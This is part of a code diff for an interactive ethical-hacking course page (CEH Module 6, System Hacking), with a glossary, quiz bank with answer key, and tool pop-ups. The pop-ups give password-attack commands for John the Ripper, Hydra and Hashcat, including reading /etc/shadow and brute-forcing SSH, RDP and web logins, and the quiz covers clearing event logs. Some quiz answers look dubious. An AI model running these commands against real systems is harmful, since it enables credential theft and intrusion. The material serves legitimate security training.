+    'privilege escalation': 'Gaining higher permissions than intended \u2014 vertically (to a higher role) or horizontally (to another user\'s resources).',
+    'rainbow table': 'A precomputed table of hashes used to reverse unsalted password hashes quickly.',
+    'ransomware': 'Malware that encrypts a victim\'s data and demands payment for the decryption key.',
+    'reconnaissance': 'The first phase of an attack: gathering information about a target before attempting to breach it.',
+    'rooting': 'Gaining privileged administrative control of an Android device by removing manufacturer restrictions.',
+    'rootkit': 'Malware that hides its presence and maintains privileged access deep in a system.',
+    'rsa': 'A widely used asymmetric algorithm whose security rests on the difficulty of factoring large numbers.',
+    'salt': 'A unique random value added to a password before hashing, defeating precomputed (rainbow-table) attacks.',
+    'sandbox': 'An isolated environment where an app runs without free access to other apps or the system.',
+    'scada': 'Supervisory Control and Data Acquisition \u2014 systems that monitor and control industrial processes.',
+    'session hijacking': 'Taking over a valid user session, typically by stealing or forging the session token.',
+    'shared responsibility model': 'The split where the cloud provider secures the infrastructure and the customer secures their data, configuration, and access.',
+    'siem': 'Security Information and Event Management \u2014 a system that aggregates and correlates logs to detect threats.',
+    'smishing': 'Phishing carried out over SMS text messages, often with malicious links.',
+    'social engineering': 'Manipulating people into revealing information or taking actions that compromise security.',
+    'sql injection': 'Injecting attacker-controlled SQL into a query so the database executes it as code rather than data.',
+    'symmetric encryption': 'Encryption using one shared secret key for both encryption and decryption; fast, ideal for bulk data (e.g. AES).',
+    'threat actor': 'Any individual or group that carries out, or intends to carry out, malicious activity.',
+    'tls': 'Transport Layer Security \u2014 the protocol behind HTTPS; uses asymmetric crypto to exchange a fast symmetric session key.',
+    'trojan': 'Malware disguised as legitimate software to trick a user into installing it.',
+    'vishing': 'Voice phishing \u2014 social engineering conducted over a phone call.',
+    'vulnerability': 'A weakness in a system that an attacker can use to compromise its security.',
+    'waf': 'Web Application Firewall \u2014 filters malicious HTTP requests; a layer of defense, not a substitute for fixing code.',
+    'web shell': 'A malicious script uploaded to a server that gives an attacker remote command execution.',
+    'wpa2': 'A long-standing Wi-Fi security standard using strong AES encryption; vulnerable when the passphrase is weak.',
+    'wpa3': 'The current Wi-Fi security standard, whose SAE handshake resists the offline dictionary attacks that defeat WPA2-PSK.',
+    'xss': 'Cross-Site Scripting \u2014 injecting malicious script into a page so it runs in other users\' browsers.',
+    'zero trust': '\u201cNever trust, always verify\u201d \u2014 a model that treats every request as untrusted regardless of origin and continuously verifies identity and authorization.',
+    'zero-day': 'A vulnerability unknown to the vendor, with no patch available, that attackers can exploit before it is fixed.'
+  };
+
+  var tipEl = null, tipTarget = null, tipHideTimer = null, tipSuppressed = null;
+
+  function ensureTipEl() {
+    if (tipEl) return tipEl;
+    tipEl = document.createElement('div');
+    tipEl.className = 'tooltip-bubble';
+    tipEl.id = 'chassisTooltip';
+    tipEl.setAttribute('role', 'tooltip');
+    tipEl.hidden = true;
+    document.body.appendChild(tipEl);
+    return tipEl;
+  }
+
+  function tipText(el) {
+    var t = el.getAttribute('data-tip');
+    if (t) return t;
+    var key = (el.getAttribute('data-term') || el.textContent || '').trim().toLowerCase();
+    return GLOSSARY[key] || '';
+  }
+
+  function positionTip(target) {
+    var b = ensureTipEl();
+    var r = target.getBoundingClientRect();
+    b.style.left = '0px'; b.style.top = '0px';
+    b.hidden = false;
+    var bw = b.offsetWidth, bh = b.offsetHeight;
+    var margin = 8, vw = document.documentElement.clientWidth;
+    var left = r.left + (r.width / 2) - (bw / 2);
+    left = Math.max(margin, Math.min(left, vw - bw - margin));
+    var top = r.top - bh - 10;
+    var placement = 'top';
+    if (top < margin) { top = r.bottom + 10; placement = 'bottom'; }
+    b.setAttribute('data-placement', placement);
+    b.style.left = (left + window.pageXOffset) + 'px';
+    b.style.top = (top + window.pageYOffset) + 'px';
+    var arrow = r.left + (r.width / 2) - left;
+    b.style.setProperty('--tip-arrow', Math.max(12, Math.min(arrow, bw - 12)) + 'px');
+  }
+
+  function showTip(target) {
+    if (target === tipSuppressed) return;   // just dismissed via Escape; wait for blur
+    var txt = tipText(target);
+    if (!txt) return;
+    if (tipHideTimer) { clearTimeout(tipHideTimer); tipHideTimer = null; }
+    var b = ensureTipEl();
+    b.textContent = txt;
+    if (!target.id) target.id = 'term-' + Math.random().toString(36).slice(2, 8);
+    target.setAttribute('aria-describedby', b.id);
+    tipTarget = target;
+    positionTip(target);
+    b.classList.add('is-visible');
+  }
+
+  function hideTip() {
+    if (!tipEl) return;
+    tipEl.classList.remove('is-visible');
+    if (tipTarget) { tipTarget.removeAttribute('aria-describedby'); tipTarget = null; }
+    tipHideTimer = setTimeout(function () { if (tipEl) tipEl.hidden = true; }, 160);
+  }
+
+  function initTooltips() {
+    // Fill aria-label + focusability for every term so definitions are reachable.
+    var terms = document.querySelectorAll('.term');
+    Array.prototype.forEach.call(terms, function (el) {
+      var txt = tipText(el);
+      if (!txt) return;
+      if (!el.hasAttribute('tabindex')) el.setAttribute('tabindex', '0');
+      el.setAttribute('role', 'button');
+      el.setAttribute('aria-label', el.textContent.trim() + ': ' + txt);
+    });
+
+    document.addEventListener('mouseover', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t) { if (t !== tipSuppressed) tipSuppressed = null; showTip(t); }
+    });
+    document.addEventListener('mouseout', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t && !(e.relatedTarget && el_closest(e.relatedTarget, '.term') === t)) hideTip();
+    });
+    document.addEventListener('focusin', function (e) {
+      var t = el_closest(e.target, '.term'); if (t) showTip(t);
+    });
+    document.addEventListener('focusout', function (e) {
+      if (el_closest(e.target, '.term')) { tipSuppressed = null; hideTip(); }
+    });
+    // Tap toggle on touch / click (the delegated onClick handles data-action separately).
+    document.addEventListener('click', function (e) {
+      var t = el_closest(e.target, '.term');
+      if (t) { e.preventDefault(); tipSuppressed = null; if (tipTarget === t) hideTip(); else showTip(t); return; }
+      if (tipTarget && !el_closest(e.target, '.tooltip-bubble')) hideTip();
+    });
+    window.addEventListener('scroll', function () { if (tipTarget) positionTip(tipTarget); }, true);
+    window.addEventListener('resize', function () { if (tipTarget) positionTip(tipTarget); });
+  }
+
+  /* ---------- init ---------- */
+  function init(config) {
+    config = config || {};
+    sectionOrder = config.sections ||
+      Array.prototype.map.call(document.querySelectorAll('.module-section'), function (s) { return s.id; });
+
+    applyTheme(prefs.theme || systemTheme());
+    applyScale(typeof prefs.scaleIndex === 'number' ? prefs.scaleIndex : 1);
+
+    var saved = getState();
+    visited = Array.isArray(saved.visited) ? saved.visited.filter(function (v) {
+      return sectionOrder.indexOf(v) !== -1;
+    }) : [];
+
+    document.addEventListener('click', onClick);
+    document.addEventListener('keydown', onGlobalKey);
+    var nav = document.querySelector('.navigation');
+    if (nav) nav.addEventListener('keydown', onNavKey);
+
+    var themeBtn = document.getElementById('themeToggle');
+    if (themeBtn) themeBtn.addEventListener('click', function () {
+      setTheme(document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+    });
+    var dec = document.getElementById('fontDec');
+    var inc = document.getElementById('fontInc');
+    if (dec) dec.addEventListener('click', function () { setScale(prefs.scaleIndex - 1); });
+    if (inc) inc.addEventListener('click', function () { setScale(prefs.scaleIndex + 1); });
+    var pr = document.getElementById('printBtn');
+    if (pr) pr.addEventListener('click', function () { window.print(); });
+
+    // notes wiring
+    var notesToggle = document.getElementById('notesToggle');
+    if (notesToggle) notesToggle.addEventListener('click', toggleNotes);
+    var notesClose = document.getElementById('notesClose');
+    if (notesClose) notesClose.addEventListener('click', closeNotes);
+    var notesArea = document.getElementById('notesArea');
+    if (notesArea) notesArea.addEventListener('input', onNotesInput);
+    var tabSec = document.getElementById('notesTabSection');
+    if (tabSec) tabSec.addEventListener('click', function () { setNotesScope('section'); });
+    var tabScr = document.getElementById('notesTabScratch');
+    if (tabScr) tabScr.addEventListener('click', function () { setNotesScope('scratch'); });
+    var notesExport = document.getElementById('notesExport');
+    if (notesExport) notesExport.addEventListener('click', exportNotes);
+    var notesClear = document.getElementById('notesClear');
+    if (notesClear) notesClear.addEventListener('click', clearScopeNotes);
+
+    var modal = document.getElementById('detailModal');
+    if (modal) modal.addEventListener('click', function (e) { if (e.target === modal) closeModal(); });
+
+    var hashSec = (window.location.hash || '').replace(/^#/, '');
+    var resume = (hashSec && sectionOrder.indexOf(hashSec) !== -1) ? hashSec
+      : (saved.current && sectionOrder.indexOf(saved.current) !== -1
+        ? saved.current : sectionOrder[0]);
+    showSection(resume, { silent: true });
+    updateProgress();
+    matrixEffect();
+    initTooltips();
+    updateNotesIndicator();
+
+    if (visited.length > 1) {
+      notify('Welcome back — resuming where you left off.');
+    }
+    if (typeof config.onReady === 'function') config.onReady();
+  }
+
+  return {
+    init: init, register: register,
+    showSection: showSection, step: step,
+    openModal: openModal, showModal: showModal, closeModal: closeModal,
+    notify: notify, announce: announce,
+    getState: getState, setState: setState,
+    updateProgress: updateProgress,
+    openNotes: openNotes, closeNotes: closeNotes, exportNotes: exportNotes
+  };
+})();
+
+</script>
+<script>
+(function () {
+  'use strict';
+
+  /* ---- module-specific behaviour (preserved from the original build) ---- */
+// Global variables
+        let currentSectionIndex = 0;
+        let sections = ['overview', 'methodology', 'password-attacks', 'privilege-escalation', 'execution', 'steganography', 'covering-tracks', 'tools', 'labs', 'quiz', 'resources'];
+        let completedSections = [];
+        let labProgress = {};
+        let quizAnswers = {};
+        let startTime = Date.now();
+
+        // Quiz questions
+        let quizQuestions = [
+            {
+                question: "What is the first phase of the CEH system hacking methodology?",
+                options: ["Escalating privileges", "Gaining access", "Covering tracks", "Executing applications"],
+                correct: 1,
+                explanation: "Gaining access is the first phase where attackers exploit vulnerabilities to gain initial system access."
+            },
+            {
+                question: "Which type of privilege escalation involves moving from standard user to administrator level?",
+                options: ["Horizontal escalation", "Vertical escalation", "Lateral escalation", "Cross escalation"],
+                correct: 1,
+                explanation: "Vertical escalation involves gaining higher privileges than those currently held, such as moving from user to admin."
+            },
+            {
+                question: "Which tool is commonly used for password cracking with multiple hash formats?",
+                options: ["Hydra", "John the Ripper", "Nmap", "Wireshark"],
+                correct: 1,
+                explanation: "John the Ripper is a multi-platform password cracker that supports numerous hash formats."
+            },
+            {
+                question: "What does NTFS ADS stand for?",
+                options: ["New Technology File System Active Directory Services", "NTFS Alternate Data Streams", "Network Transfer File System Advanced Data Security", "None of the above"],
+                correct: 1,
+                explanation: "NTFS Alternate Data Streams (ADS) are hidden streams that contain metadata for files in Windows."
+            },
+            {
+                question: "Which attack method uses pre-computed hash lookups for password cracking?",
+                options: ["Dictionary attack", "Brute force attack", "Rainbow table attack", "Hybrid attack"],
+                correct: 2,
+                explanation: "Rainbow table attacks use pre-computed hash tables to quickly look up password hashes."
+            },
+            {
+                question: "What is steganography primarily used for?",
+                options: ["Password cracking", "Hiding data within other data", "Network scanning", "Privilege escalation"],
+                correct: 1,
+                explanation: "Steganography is the practice of concealing data within other non-secret data or physical objects."
+            },
+            {
+                question: "Which Windows command can be used to clear event logs?",
+                options: ["clearlogs", "wevtutil cl", "eventclear", "logdelete"],
+                correct: 1,
+                explanation: "The wevtutil cl command is used to clear Windows event logs."
+            },
+            {
+                question: "What is the primary purpose of keyloggers in system hacking?",
+                options: ["Clear system logs", "Escalate privileges", "Capture user keystrokes", "Hide files"],
+                correct: 2,
+                explanation: "Keyloggers are designed to record and capture user keystrokes, often to steal passwords and sensitive information."
+            },
+            {
+                question: "Which Metasploit command is used to background a session?",
+                options: ["background", "session -i", "migrate", "exit"],
+                correct: 0,
+                explanation: "The 'background' command in Metasploit is used to background the current session."
+            },
+            {
+                question: "What does DLL hijacking exploit?",
+                options: ["Network protocols", "Password policies", "Library loading mechanisms", "Registry entries"],
+                correct: 2,
+                explanation: "DLL hijacking exploits the way Windows applications load dynamic link libraries by placing malicious DLLs in the search path."
+            },
+            {
+                question: "Which Linux command is used for secure file deletion?",
+                options: ["rm -rf", "delete", "shred", "wipe"],
+                correct: 2,
+                explanation: "The shred command overwrites files multiple times to make data recovery difficult."
+            },
+            {
+                question: "What is the main difference between spyware and keyloggers?",
+                options: ["Spyware only captures keystrokes", "Keyloggers monitor broader user activities", "Spyware monitors broader activities while keyloggers focus on keystrokes", "There is no difference"],
+                correct: 2,
+                explanation: "Spyware monitors broader user activities while keyloggers specifically focus on capturing keystrokes."
+            },
+            {
+                question: "Which technique involves injecting a compromised hash into a local session?",
+                options: ["Pass-the-hash", "Hash injection attack", "Rainbow table attack", "Dictionary attack"],
+                correct: 1,
+                explanation: "Hash injection attacks involve injecting a compromised hash into a local session to validate network resources."
+            },
+            {
+                question: "What is the primary purpose of rootkits?",
+                options: ["Password cracking", "Network scanning", "Hiding malicious presence", "Privilege escalation"],
+                correct: 2,
+                explanation: "Rootkits are designed to hide the presence of malicious software and maintain persistent access."
+            },
+            {
+                question: "Which tool is used for LLMNR/NBT-NS poisoning attacks?",
+                options: ["Responder", "Hydra", "John the Ripper", "Metasploit"],
+                correct: 0,
+                explanation: "Responder is a tool commonly used for LLMNR/NBT-NS poisoning attacks to capture credentials."
+            },
+            {
+                question: "What does the 'Snow' steganography tool hide data in?",
+                options: ["Image files", "Audio files", "Text whitespace", "Video files"],
+                correct: 2,
+                explanation: "Snow conceals messages in ASCII text by appending whitespace to the end of lines."
+            },
+            {
+                question: "Which Windows feature should be disabled to prevent LLMNR poisoning?",
+                options: ["Windows Defender", "LLMNR & NBT-NS", "Windows Firewall", "User Account Control"],
+                correct: 1,
+                explanation: "Disabling LLMNR & NBT-NS prevents these poisoning attacks that can lead to credential theft."
+            },
+            {
+                question: "What is the recommended maximum password change interval for security?",
+                options: ["90 days", "60 days", "30 days", "7 days"],
+                correct: 2,
+                explanation: "The recommended password change policy is less than 30 days for enhanced security."
+            },
+            {
+                question: "Which post-exploitation tool checks for privilege escalation opportunities on Linux?",
+                options: ["LinEnum", "BeRoot", "Both A and B", "Neither A nor B"],
+                correct: 2,
+                explanation: "Both LinEnum and BeRoot are tools used to check for privilege escalation opportunities on Linux systems."
+            },
+            {
+                question: "What does GMER primarily detect?",
+                options: ["Network vulnerabilities", "Password weaknesses", "Rootkits", "Web application flaws"],
+                correct: 2,
+                explanation: "GMER is a rootkit detection and removal tool that scans for hidden processes and files."
+            },
+            {
+                question: "Which attack vector exploits unquoted service paths in Windows?",
+                options: ["DLL hijacking", "Service privilege escalation", "Registry manipulation", "Process injection"],
+                correct: 1,
+                explanation: "Unquoted service paths can be exploited for privilege escalation when services run with SYSTEM privileges."
+            },
+            {
+                question: "What is the primary goal of covering tracks in system hacking?",
+                options: ["Gain initial access", "Escalate privileges", "Avoid detection", "Execute applications"],
+                correct: 2,
+                explanation: "Covering tracks aims to remove evidence and avoid detection by security systems and administrators."
+            },
+            {
+                question: "Which Metasploit module suggests local exploits for privilege escalation?",
+                options: ["exploit_suggester", "local_exploit_suggester", "priv_esc_suggester", "escalation_finder"],
+                correct: 1,
+                explanation: "The local_exploit_suggester post-exploitation module suggests potential local exploits for privilege escalation."
+            },
+            {
+                question: "What does the elsave command accomplish?",
+                options: ["Save event logs", "Clear event logs", "Backup registry", "Create system restore point"],
+                correct: 1,
+                explanation: "The elsave command is used to clear event logs and cover an attacker's tracks."
+            },
+            {
+                question: "Which steganography detection tool can identify hidden content in images?",
+                options: ["Stegdetect", "ImageHide", "Snow", "Blindside"],
+                correct: 0,
+                explanation: "Stegdetect is a steganography detection tool that can identify hidden content in images."
+            }
+        ];
+
+        // Initialize the application
+        
+
+        // Keyboard navigation
+        
+function handleKeyboardNavigation(event) {
+            switch(event.key) {
+                case 'Escape':
+                    CEH.closeModal();
+                    break;
+                case 'ArrowLeft':
+                    if (currentSectionIndex > 0) {
+                        navigateToSection(currentSectionIndex - 1);
+                    }
+                    break;
+                case 'ArrowRight':
+                    if (currentSectionIndex < sections.length - 1) {
+                        navigateToSection(currentSectionIndex + 1);
+                    }
+                    break;
+            }
+        }
+
+        // Navigate to section by index
+        
+function navigateToSection(index) {
+            if (index >= 0 && index < sections.length) {
+                CEH.showSection(sections[index]);
+            }
+        }
+
+        // Show section function
+        
+
+        // Update progress bar
+        
+
+        // Modal functions
+        
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+
+        // Lab functions
+        
+function startLab(labName) {
+            if (!labProgress[labName]) {
+                labProgress[labName] = {
+                    started: true,
+                    completed: false,
+                    timestamp: new Date().toISOString()
+                };
+            }
+            
+            // Show lab progress
+            updateLabProgress();
+            
+            // Simulate lab environment (in real implementation, this would open a virtual lab)
+            alert(`🧪 Starting ${labName} laboratory...\n\nThis would normally open a virtual lab environment.\nFor this demo, the lab is marked as started.`);
+            
+            // Auto-complete for demo purposes (remove in real implementation)
+            setTimeout(() => {
+                labProgress[labName].completed = true;
+                updateLabProgress();
+                
+                if (Object.keys(labProgress).length >= 3) {
+                    document.getElementById('assessmentBtn').style.display = 'inline-block';
+                }
+            }, 2000);
+        }
+function updateLabProgress() {
+            const progressContainer = document.getElementById('labProgress');
+            const progressContent = document.getElementById('labProgressContent');
+            
+            if (Object.keys(labProgress).length > 0) {
+                progressContainer.style.display = 'block';
+                
+                let progressHTML = '<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">';
+                
+                Object.entries(labProgress).forEach(([labName, progress]) => {
+                    const status = progress.completed ? '✅ Completed' : '🔄 In Progress';
+                    const bgColor = progress.completed ? 'rgba(39, 174, 96, 0.2)' : 'rgba(241, 196, 15, 0.2)';
+                    
+                    progressHTML += `
+                        <div style="background: ${bgColor}; padding: 15px; border-radius: 8px; border-left: 4px solid ${progress.completed ? '#27ae60' : '#f1c40f'};">
+                            <h4>${labName.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</h4>
+                            <p>${status}</p>
+                            <small>Started: ${new Date(progress.timestamp).toLocaleString()}</small>
+                        </div>
+                    `;
+                });
+                
+                progressHTML += '</div>';
+                progressContent.innerHTML = progressHTML;
+            }
+        }
+
+        // Quiz functions
+        
+function generateQuiz() {
+            const quizContainer = document.getElementById('quizContainer');
+            let quizHTML = '<h4>📝 System Hacking Assessment</h4>';
+            
+            quizQuestions.forEach((q, index) => {
+                quizHTML += `
+                    <div class="question">
+                        <h5>Question ${index + 1}:</h5>
+                        <p>${q.question}</p>
+                        ${q.options.map((option, optIndex) => `
+                            <label class="option">
+                                <input type="radio" name="q${index}" value="${optIndex}">
+                                ${option}
+                            </label>
+                        `).join('')}
+                    </div>
+                `;
+            });
+            
+            quizHTML += '<button class="btn btn-success" data-action="submitQuiz">Submit Assessment</button>';
+            quizContainer.innerHTML = quizHTML;
+        }
+function submitQuiz() {
+            let score = 0;
+            let totalQuestions = quizQuestions.length;
+            let results = [];
+            
+            quizQuestions.forEach((q, index) => {
+                const selectedAnswer = document.querySelector(`input[name="q${index}"]:checked`);
+                const isCorrect = selectedAnswer && parseInt(selectedAnswer.value) === q.correct;
+                
+                if (isCorrect) score++;
+                
+                results.push({
+                    question: q.question,
+                    selected: selectedAnswer ? parseInt(selectedAnswer.value) : -1,
+                    correct: q.correct,
+                    isCorrect: isCorrect,
+                    explanation: q.explanation
+                });
+            });
+            
+            const percentage = Math.round((score / totalQuestions) * 100);
+            const passed = percentage >= 80;
+            
+            showQuizResults(score, totalQuestions, percentage, passed, results);
+        }
+function showQuizResults(score, total, percentage, passed, results) {
+            const resultsContainer = document.getElementById('quizResults');
+            const resultsContent = document.getElementById('resultsContent');
+            
+            const statusColor = passed ? '#27ae60' : '#e74c3c';
+            const statusText = passed ? 'PASSED' : 'FAILED';
+            const statusIcon = passed ? '✅' : '❌';
+            
+            let resultsHTML = `
+                <div style="text-align: center; background: linear-gradient(135deg, ${statusColor}20, ${statusColor}10); padding: 30px; border-radius: 15px; margin: 20px 0;">
+                    <h2 style="color: ${statusColor};">${statusIcon} ${statusText}</h2>
+                    <div style="font-size: 2.5em; font-weight: bold; color: ${statusColor}; margin: 20px 0;">${percentage}%</div>
+                    <p style="font-size: 1.2em;">Score: ${score}/${total} questions correct</p>
+                    <p>Passing score: 80% (20/25 questions)</p>
+                </div>
+            `;
+            
+            if (passed) {
+                resultsHTML += `
+                    <div style="background: linear-gradient(135deg, rgba(39, 174, 96, 0.1), rgba(39, 174, 96, 0.05)); padding: 20px; border-radius: 10px; border-left: 4px solid #27ae60; margin: 20px 0;">
+                        <h4>🎉 Congratulations!</h4>
+                        <p>You have successfully completed CEH v13 Module 6: System Hacking. You can now proceed to the next module or continue practicing with additional labs.</p>
+                    </div>
+                `;
+            } else {
+                resultsHTML += `
+                    <div style="background: linear-gradient(135deg, rgba(231, 76, 60, 0.1), rgba(231, 76, 60, 0.05)); padding: 20px; border-radius: 10px; border-left: 4px solid #e74c3c; margin: 20px 0;">
+                        <h4>📚 Study Recommendation</h4>
+                        <p>Please review the module content and retake the assessment. Focus on the areas where you answered incorrectly.</p>
+                    </div>
+                `;
+            }
+            
+            // Show detailed results
+            resultsHTML += '<h4>📊 Detailed Results</h4>';
+            results.forEach((result, index) => {
+                const resultColor = result.isCorrect ? '#27ae60' : '#e74c3c';
+                const resultIcon = result.isCorrect ? '✅' : '❌';
+                
+                resultsHTML += `
+                    <div style="background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 8px; margin: 10px 0; border-left: 4px solid ${resultColor};">
+                        <p><strong>Question ${index + 1}:</strong> ${resultIcon} ${result.isCorrect ? 'Correct' : 'Incorrect'}</p>
+                        <p style="font-size: 0.9em; opacity: 0.8;">${result.explanation}</p>
+                    </div>
+                `;
+            });
+            
+            resultsContent.innerHTML = resultsHTML;
+            resultsContainer.style.display = 'block';
+            
+            // Scroll to results
+            resultsContainer.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Calculate study time
+        
+function getStudyTime() {
+            const currentTime = Date.now();
+            const studyTimeMs = currentTime - startTime;
+            const studyTimeMinutes = Math.round(studyTimeMs / (1000 * 60));
+            return studyTimeMinutes;
+        }
+
+        // Initialize when page loads
+        
+    
+
+  /* ---- Tool detail modals ----
+     The legacy build expected hidden <div id="...Modal"> elements that the old
+     openModal() would reveal. The chassis owns openModal now and treats its
+     argument as content, so we register a module handler that maps each modal
+     id to rich HTML. This also lets the deep-content rewrite reference detailed
+     tool cards without embedding large hidden divs in the markup. */
+  var M6_MODALS = {
+    johnRipperModal: {
+      title: 'John the Ripper',
+      html: '<p><strong>John the Ripper</strong> is a mature, CPU-based offline password cracker prized for its flexibility and format auto-detection. It is the tool of choice for quick jobs, mixed hash files, and environments without a GPU.</p>' +
+            '<h4>Where it fits</h4><p>Offline cracking of dumped hashes during the gaining-access phase. Its <code>unshadow</code> utility merges Linux <code>/etc/passwd</code> and <code>/etc/shadow</code> into a single crackable file, and companion tools (<code>zip2john</code>, <code>ssh2john</code>, <code>office2john</code>) extract crackable hashes from password-protected files.</p>' +
+            '<h4>Typical use</h4><div class="code-block"># Auto-detect format and crack with a wordlist\njohn --wordlist=rockyou.txt hashes.txt\n\n# Merge shadow files, then crack\nunshadow /etc/passwd /etc/shadow > crack.txt\njohn crack.txt\n\n# Show cracked results\njohn --show hashes.txt</div>' +
+            '<h4>John vs. Hashcat</h4><p>Reach for John when you want fast setup, CPU-only operation, or its file-extraction helpers. Reach for Hashcat when raw speed against a large hash set matters and you have a GPU.</p>'
+    },
+    hydraModal: {
+      title: 'Hydra',
+      html: '<p><strong>Hydra</strong> (thc-hydra) is the standard tool for <em>online</em> password attacks — throwing dictionary or brute-force guesses at live network services rather than cracking hashes offline.</p>' +
+            '<h4>Where it fits</h4><p>The gaining-access phase, against services like SSH, RDP, FTP, SMB, and HTTP login forms. Because every attempt hits the target, Hydra is inherently loud: it generates authentication logs and risks triggering account lockout. It is used where lockout policies are weak or absent, or for password spraying a single common password across many accounts.</p>' +
+            '<h4>Typical use</h4><div class="code-block"># Dictionary attack against SSH for a known user\nhydra -l admin -P wordlist.txt ssh://192.168.1.10\n\n# Try many users and passwords against RDP\nhydra -L users.txt -P passwords.txt rdp://192.168.1.10\n\n# Attack an HTTP POST login form\nhydra -l admin -P wordlist.txt 192.168.1.10 http-post-form \\\n  "/login:user=^USER^&pass=^PASS^:Invalid"</div>' +
+            '<h4>Detection</h4><p>Trivial to spot for a prepared defender: bursts of failed authentications from one source. Lockout policies, rate limiting, and MFA all blunt it.</p>'
+    },
+    hashcatModal: {
+      title: 'Hashcat',
+      html: '<p><strong>Hashcat</strong> is the fastest password cracker available, using GPU acceleration to compute billions of hash guesses per second. It supports 350+ hash modes and has the best rule engine of any cracker.</p>' +
+            '<h4>Where it fits</h4><p>Serious <em>offline</em> cracking once hashes are in hand — SAM/NTDS dumps, database leaks, captured NetNTLMv2 or WPA handshakes. The <code>-m</code> flag selects the hash mode (e.g. 1000 for NTLM, 3200 for bcrypt) and <code>-a</code> selects the attack mode.</p>' +
+            '<h4>Typical use</h4><div class="code-block"># Dictionary + rules against NTLM (the highest-yield attack)\nhashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule\n\n# Mask attack: brute-force a known pattern (8 chars, upper+lower+digit)\nhashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d\n\n# Show what has been cracked (results persist in the potfile)\nhashcat -m 1000 hashes.txt --show</div>' +
+            '<h4>The key limit</h4><p>Speed depends entirely on the hash. Fast hashes (NTLM, MD5) fall quickly; a high-cost bcrypt or Argon2 hash can be effectively uncrackable, which is exactly why defenders should use them.</p>'
+    }
+  };
+
+  function openToolModal(modalId) {
+    var m = M6_MODALS[modalId];
+    if (m) { CEH.openModal(m.title, m.html); }
+    else { CEH.openModal('', '<p>Details for this item are coming soon.</p>'); }
+  }
+
+  /* ---- Render the quiz on load ----
+     generateQuiz() populates #quizContainer from the quizQuestions bank. The
+     legacy build called it from its old bootstrap, which the chassis replaced,
+     so the assessment never appeared. The chassis calls moduleReady() once the
+     module has initialized — we render the quiz there. */
+  function moduleReady() {
+    if (typeof generateQuiz === 'function' &&
+        document.getElementById('quizContainer')) {
+      try { generateQuiz(); } catch (e) { console.error('[M6] quiz render failed:', e); }
+    }
+  }
+
+  /* ---- wire it to the chassis ---- */
+  CEH.register({
+      generateQuiz: generateQuiz,
+      getStudyTime: getStudyTime,
+      handleKeyboardNavigation: handleKeyboardNavigation,
+      moduleReady: moduleReady,
+      navigateToSection: navigateToSection,
+      openToolModal: openToolModal,
+      showQuizResults: showQuizResults,
+      startLab: startLab,
+      submitQuiz: submitQuiz,
+      updateLabProgress: updateLabProgress
+  });
+
+  CEH.init({ sections: ["overview", "methodology", "password-attacks", "privilege-escalation", "execution", "steganography", "covering-tracks", "tools", "labs", "quiz", "resources"], onReady: moduleReady });
+})();
+</script>
+</body>
+</html>
